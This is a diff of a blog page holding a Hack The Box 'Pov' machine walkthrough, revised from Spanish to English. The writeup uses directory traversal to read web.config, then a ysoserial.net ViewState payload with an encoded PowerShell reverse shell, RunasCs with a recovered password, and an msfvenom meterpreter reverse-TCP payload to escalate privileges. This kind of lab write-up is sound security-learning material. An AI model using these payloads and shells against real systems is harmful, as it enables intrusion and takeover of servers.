@@ -1,6 +1,6 @@
 <!DOCTYPE html>
 <html lang="en" dir="ltr" class="scroll-smooth" data-default-appearance="dark"
-  data-auto-appearance="false"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  data-auto-appearance="false"><head>
   <meta charset="utf-8" />
   
   <meta http-equiv="content-language" content="en" />
@@ -15,7 +15,7 @@
   <meta name="keywords" content="medium, " />
   
   
-  <link rel="canonical" href="http://localhost:1313/writeups/14.-pov/" />
+  <link rel="canonical" href="https://your_domain.com/writeups/14.-pov/" />
   
   
   
@@ -62,21 +62,21 @@
   
   
   
-  <meta property="og:url" content="http://localhost:1313/writeups/14.-pov/">
+  <meta property="og:url" content="https://your_domain.com/writeups/14.-pov/">
   <meta property="og:site_name" content="Mil4ne&#39;s Blog">
   <meta property="og:title" content="Pov Writeup">
   <meta property="og:description" content="Initial Recon # We start our scans with nmap.">
   <meta property="og:locale" content="en">
   <meta property="og:type" content="article">
     <meta property="article:section" content="writeups">
-    <meta property="article:published_time" content="2022-01-25T00:00:00+00:00">
-    <meta property="article:modified_time" content="2022-01-25T00:00:00+00:00">
+    <meta property="article:published_time" content="2024-06-09T00:00:00+00:00">
+    <meta property="article:modified_time" content="2024-06-09T00:00:00+00:00">
     <meta property="article:tag" content="Medium">
-    <meta property="og:image" content="http://localhost:1313/writeups/14.-pov/featured.png">
+    <meta property="og:image" content="https://your_domain.com/writeups/14.-pov/featured.png">
 
   
   <meta name="twitter:card" content="summary_large_image">
-  <meta name="twitter:image" content="http://localhost:1313/writeups/14.-pov/featured.png">
+  <meta name="twitter:image" content="https://your_domain.com/writeups/14.-pov/featured.png">
   <meta name="twitter:title" content="Pov Writeup">
   <meta name="twitter:description" content="Initial Recon # We start our scans with nmap.">
 
@@ -91,21 +91,21 @@
     
     "abstract": "Initial Recon # We start our scans with nmap.",
     "inLanguage": "en",
-    "url" : "http:\/\/localhost:1313\/writeups\/14.-pov\/",
+    "url" : "https:\/\/your_domain.com\/writeups\/14.-pov\/",
     "author" : {
       "@type": "Person",
       "name": "Mil4ne"
     },
-    "copyrightYear": "2022",
-    "dateCreated": "2022-01-25T00:00:00\u002b00:00",
-    "datePublished": "2022-01-25T00:00:00\u002b00:00",
+    "copyrightYear": "2024",
+    "dateCreated": "2024-06-09T00:00:00\u002b00:00",
+    "datePublished": "2024-06-09T00:00:00\u002b00:00",
     
-    "dateModified": "2022-01-25T00:00:00\u002b00:00",
+    "dateModified": "2024-06-09T00:00:00\u002b00:00",
     
     "keywords": ["medium"],
     
     "mainEntityOfPage": "true",
-    "wordCount": "475"
+    "wordCount": "657"
   }]
   </script>
 
@@ -749,7 +749,7 @@
 <div class="flex flex-row flex-wrap items-center">
   
   
-  <time datetime="2022-01-25 00:00:00 &#43;0000 UTC">25 January 2022</time>
+  <time datetime="2024-06-09 00:00:00 &#43;0000 UTC">9 June 2024</time>
   
 
   
@@ -801,7 +801,7 @@
     </div>
     
     
-    <div class="text-sm text-neutral-700 dark:text-neutral-400">A little bit about you</div>
+    <div class="text-sm text-neutral-700 dark:text-neutral-400">14 Post</div>
     
     <div class="text-2xl sm:text-lg">
   <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
@@ -878,13 +878,16 @@
     <li><a href="#span-stylecolor-33acffinitial-reconspan"><span style="color: #33acff">Initial Recon</span></a></li>
     <li><a href="#span-stylecolor-33acffwebspan"><span style="color: #33acff">Web</span></a>
       <ul>
-        <li><a href="#buscando-subdominios">Buscando Subdominios</a></li>
-        <li><a href="#directory-brute-force">Directory Brute Force</a></li>
+        <li><a href="#searching-subdomains">Searching Subdomains</a></li>
         <li><a href="#directory-traversal">Directory Traversal</a></li>
         <li><a href="#ysoserial">Ysoserial</a></li>
       </ul>
     </li>
-    <li><a href="#span-stylecolor-33acffmovimiento-lateralspan"><span style="color: #33acff">Movimiento Lateral</span></a></li>
+    <li><a href="#span-stylecolor-33acfflateral-movementspan"><span style="color: #33acff">Lateral Movement</span></a>
+      <ul>
+        <li><a href="#what-is-sedebugprivilege">What is SeDebugPrivilege?</a></li>
+      </ul>
+    </li>
     <li><a href="#span-stylecolor-33acffprivilege-escalationspan"><span style="color: #33acff">Privilege Escalation</span></a></li>
   </ul>
 </nav>
@@ -902,13 +905,16 @@
     <li><a href="#span-stylecolor-33acffinitial-reconspan"><span style="color: #33acff">Initial Recon</span></a></li>
     <li><a href="#span-stylecolor-33acffwebspan"><span style="color: #33acff">Web</span></a>
       <ul>
-        <li><a href="#buscando-subdominios">Buscando Subdominios</a></li>
-        <li><a href="#directory-brute-force">Directory Brute Force</a></li>
+        <li><a href="#searching-subdomains">Searching Subdomains</a></li>
         <li><a href="#directory-traversal">Directory Traversal</a></li>
         <li><a href="#ysoserial">Ysoserial</a></li>
       </ul>
     </li>
-    <li><a href="#span-stylecolor-33acffmovimiento-lateralspan"><span style="color: #33acff">Movimiento Lateral</span></a></li>
+    <li><a href="#span-stylecolor-33acfflateral-movementspan"><span style="color: #33acff">Lateral Movement</span></a>
+      <ul>
+        <li><a href="#what-is-sedebugprivilege">What is SeDebugPrivilege?</a></li>
+      </ul>
+    </li>
     <li><a href="#span-stylecolor-33acffprivilege-escalationspan"><span style="color: #33acff">Privilege Escalation</span></a></li>
   </ul>
 </nav>
@@ -985,45 +991,31 @@
     
 </h2>
 <img src="img/1.png" alt="">
-<p>Buscamos en la pagina pero no enontramos nada interesante.</p>
+<p>We searched the site but found nothing interesting.</p>
 
 
-<h3 class="relative group">Buscando Subdominios 
-    <div id="buscando-subdominios" class="anchor"></div>
+<h3 class="relative group">Searching Subdomains 
+    <div id="searching-subdomains" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#buscando-subdominios" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#searching-subdomains" aria-label="Anchor">#</a>
     </span>        
     
 </h3>
-<p>Hacemos fuzzing de subdomains:</p>
+<p>We do fuzzing of subdomains:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ffuf -u http://10.10.11.251 -H <span class="s2">&#34;Host: FUZZ.pov.htb&#34;</span> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -mc all -ac
 </span></span></code></pre></div><img src="img/2.png" alt="">
-<p>Encontramos un subdominio llamado <code>dev.pov.htb</code>:</p>
+<p>We found a subdomain called <code>dev.pov.htb</code>:</p>
 <img src="img/3.png" alt="">
-<p>si investigamos un poco la pagina, podemos ver que en varias partes menciona ASP.NET, lo cual ya nos deha claro que la pagina esta hecha en esto.</p>
+<p>If we investigate a little the page, we can see that in several parts it mentions ASP.NET, which already makes us clear that the page is made in this.</p>
 <img src="img/4.png" alt="">
-<p>En el boton de descargar cv podemos ver esto:</p>
+<p>In the download cv button we can see this:</p>
 <img src="img/5.png" alt="">
-
-
-<h3 class="relative group">Directory Brute Force 
-    <div id="directory-brute-force" class="anchor"></div>
-    
-    <span
-        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
-        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#directory-brute-force" aria-label="Anchor">#</a>
-    </span>        
-    
-</h3>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">feroxbuster -u http://dev.pov.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -x a
-</span></span><span class="line"><span class="cl">spx
-</span></span></code></pre></div><img src="img/6.png" alt="">
-<p>si vamos al burpsuite y pasamos la request</p>
+<p>We send the request to the burpsuite</p>
 <img src="img/7.png" alt="">
+<p>If we notice in the <code>file</code> parameter is calling the pdf of the CV</p>
 
 
 <h3 class="relative group">Directory Traversal 
@@ -1036,8 +1028,9 @@
     </span>        
     
 </h3>
+<p>We can try to see the <code>etc/hosts</code> file.</p>
 <img src="img/8.png" alt="">
-<p>Podemos ver el web.config:</p>
+<p>there is a file called <code>web.config</code>, which may be of interest:</p>
 <img src="img/10.png" alt="">
 
 
@@ -1051,36 +1044,38 @@
     </span>        
     
 </h3>
-<p><a href="https://github.com/pwntester/ysoserial.net"   target="_blank">
+<p>We are going to generate a payload with the Ysoserial tool which allows us to create them in .NET:
+<a href="https://github.com/pwntester/ysoserial.net"   target="_blank">
     https://github.com/pwntester/ysoserial.net</a></p>
-<p>Usamos la powershell base64:
+<p>We use the base64 powershell:
 <a href="https://www.revshells.com/"   target="_blank">
     https://www.revshells.com/</a></p>
 <blockquote>
-<p>Esto lo ejecutamos desde una maquina windows para crear la cadena que le vamos a enviar a la maquina victima:</p>
+<p>We run this from a windows machine to create the string that we are going to send to the victim machine:</p>
 </blockquote>
 <pre tabindex="0"><code>./ysoserial.exe -p ViewState -g WindowsIdentity --decryptionalg=&#34;AES&#34; --decryptionkey=&#34;74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43&#34; --validationalg=&#34;SHA1&#34; --validationkey=&#34;5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468&#34; --path=&#34;/portfolio&#34; -c &#34;powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQAwADkAIgAsADkAMAAwADEAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA&#34;
-</code></pre><img src="img/11.png" alt="">
-<p>Nos ponemos en escucha:</p>
+</code></pre><p>We insert our payload to the <code>VIEWSTATE</code> parameter, as follows:</p>
+<img src="img/11.png" alt="">
+<p>I am listening on port 9001:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo rlwrap -cAr nc -lvnp <span class="m">9001</span> 
 </span></span></code></pre></div><img src="img/12.png" alt="">
-<p>si vamos a la ruta:</p>
+<p>After searching in different machine paths:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">Path</span>                    
 </span></span><span class="line"><span class="cl"><span class="p">----</span>                    
 </span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Users</span><span class="p">\</span><span class="n">sfitz</span><span class="p">\</span><span class="n">Documents</span>
 </span></span></code></pre></div>
 
-<h2 class="relative group"><span style="color: #33acff">Movimiento Lateral</span> 
-    <div id="span-stylecolor-33acffmovimiento-lateralspan" class="anchor"></div>
+<h2 class="relative group"><span style="color: #33acff">Lateral Movement</span> 
+    <div id="span-stylecolor-33acfflateral-movementspan" class="anchor"></div>
     
     <span
         class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
         <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
-            style="text-decoration-line: none !important;" href="#span-stylecolor-33acffmovimiento-lateralspan" aria-label="Anchor">#</a>
+            style="text-decoration-line: none !important;" href="#span-stylecolor-33acfflateral-movementspan" aria-label="Anchor">#</a>
     </span>        
     
 </h2>
-<p>podemos ver un archivo xml que contiene lo siguiente:</p>
+<p>we can see an xml file containing the following:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="nt">&lt;Objs</span> <span class="na">Version=</span><span class="s">&#34;1.1.0.1&#34;</span> <span class="na">xmlns=</span><span class="s">&#34;http://schemas.microsoft.com/powershell/2004/04&#34;</span><span class="nt">&gt;</span>
 </span></span><span class="line"><span class="cl">  <span class="nt">&lt;Obj</span> <span class="na">RefId=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;TN</span> <span class="na">RefId=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
@@ -1094,22 +1089,51 @@
 </span></span><span class="line"><span class="cl">    <span class="nt">&lt;/Props&gt;</span>
 </span></span><span class="line"><span class="cl">  <span class="nt">&lt;/Obj&gt;</span>
 </span></span><span class="line"><span class="cl"><span class="nt">&lt;/Objs&gt;</span>
-</span></span></code></pre></div><p>usaré el comando Import-CliXml PowerShell para leer el archivo y obtener la contraseña en texto plano</p>
+</span></span></code></pre></div><p>I will use the <code>Import-CliXml</code> PowerShell command to read the file and obtain the password in plain text</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span> <span class="p">=</span> <span class="nb">Import-CliXml</span> <span class="n">-Path</span> <span class="n">connection</span><span class="p">.</span><span class="py">xml</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nv">$cred</span><span class="p">.</span><span class="py">GetNetworkCredential</span><span class="p">().</span><span class="py">Password</span>
-</span></span></code></pre></div><p>nos traemos el runas a la maquina victima:</p>
+</span></span></code></pre></div><p>we bring the runas to the victim machine:</p>
 <p><a href="https://github.com/antonioCoco/RunasCs"   target="_blank">
     https://github.com/antonioCoco/RunasCs</a></p>
-<p>creamos un servidor en smb para pasarnos este archivo a la maquina victima:</p>
+<p>We create an smb server to pass this file to the victim machine:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo impacket-smbserver share -smb2support /tmp/share -user <span class="nb">test</span> -password <span class="nb">test</span> 
-</span></span></code></pre></div><p>creamos una carpeta tmp en C:\ de la maquina victima:</p>
+</span></span></code></pre></div><p>create a tmp folder in <code>C:\</code> on the victim machine:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="n">n:</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">109</span><span class="p">\</span><span class="n">share</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">test</span> <span class="n">test</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy </span><span class="n">n:</span><span class="p">\</span><span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span>
-</span></span></code></pre></div><p>ejecuto el runas:</p>
+</span></span></code></pre></div><p>I run the runas:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">RunasCs</span><span class="p">.</span><span class="py">exe</span> <span class="n">alaading</span> <span class="n">f8gQ8fynP44ek1m3</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="n">-r</span> <span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">109</span><span class="err">:</span><span class="mf">4444</span>
-</span></span></code></pre></div><p>nos ponemos en escucha:</p>
+</span></span></code></pre></div><p>we are listening:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">rlwrap -cAr nc -lnvp <span class="m">4444</span>
-</span></span></code></pre></div><img src="img/13.png" alt="">
+</span></span></code></pre></div><p>from the powershell we can see this <code>priv</code></p>
+
+
+<h3 class="relative group">What is SeDebugPrivilege? 
+    <div id="what-is-sedebugprivilege" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#what-is-sedebugprivilege" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>he SeDebugPrivilege in Windows allows a user to perform system-level debugging. In simple terms, with this privilege, a user can:</p>
+<ul>
+<li>
+<p>Access all system processes:
+Including those that are normally protected and inaccessible, such as operating system processes and critical services.</p>
+</li>
+<li>
+<p>Modify or terminate protected processes:
+The user can terminate processes that standard users would not normally be able to stop.</p>
+</li>
+<li>
+<p>Read and write to the memory of any process:
+This includes the ability to inject code or make real-time modifications to running processes.</p>
+</li>
+</ul>
+<p>This privilege is very powerful and is usually reserved for system accounts and administrators because it can be used to bypass almost all security measures of the operating system.</p>
+<img src="img/13.png" alt="">
 
 
 <h2 class="relative group"><span style="color: #33acff">Privilege Escalation</span> 
@@ -1122,13 +1146,13 @@
     </span>        
     
 </h2>
-<p>Creamos un archivo con msfvenom:</p>
+<p>We create a file with msfvenom:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.10.14.109 <span class="nv">LPORT</span><span class="o">=</span><span class="m">6969</span> -f exe -o platanoo.exe
-</span></span></code></pre></div><p>Pasamos nuevamente el archivo la maquina victima:</p>
+</span></span></code></pre></div><p>We pass the file back to the victim machine:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">sudo impacket-smbserver share -smb2support /tmp/share -user <span class="nb">test</span> -password <span class="nb">test</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">net</span> <span class="n">use</span> <span class="n">n:</span> <span class="p">\\</span><span class="mf">10.10</span><span class="p">.</span><span class="py">14</span><span class="p">.</span><span class="mf">109</span><span class="p">\</span><span class="n">share</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="n">test</span> <span class="n">test</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">copy </span><span class="n">n:</span><span class="p">\</span><span class="n">platanoo</span><span class="p">.</span><span class="py">exe</span>
-</span></span></code></pre></div><p>ahora nos ponemos en escucha con el meterpreter:</p>
+</span></span></code></pre></div><p>we are now listening to the meterpreter:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msfconsole
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; use exploit/multi/handler
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">msf6 &gt; <span class="nb">set</span> payload windows/x64/meterpreter/reverse_tcp
@@ -1136,10 +1160,10 @@
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> LPORT <span class="m">6969</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">run
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Started reverse TCP handler on 10.10.14.109:6969 
-</span></span></code></pre></div><p>Ahora ejecutamos el .exe en la maquina victima:</p>
+</span></span></code></pre></div><p>Now we run the .exe on the victim machine:</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">./</span><span class="n">platanoo</span><span class="p">.</span><span class="py">exe</span>
 </span></span></code></pre></div><img src="img/14.png" alt="">
-<p>Vamos a migrar a este proceso</p>
+<p>We will migrate to this process</p>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">meterpreter &gt; migrate <span class="m">552</span>
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Migrating from <span class="m">2032</span> to 552...
 </span></span><span class="line"><span class="cl"><span class="o">[</span>*<span class="o">]</span> Migration completed successfully.
@@ -1223,7 +1247,7 @@
 </footer><div
   id="search-wrapper"
   class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
-  data-url="http://localhost:1313/"
+  data-url="https://your_domain.com/"
   style="z-index:500"
 >
   <div
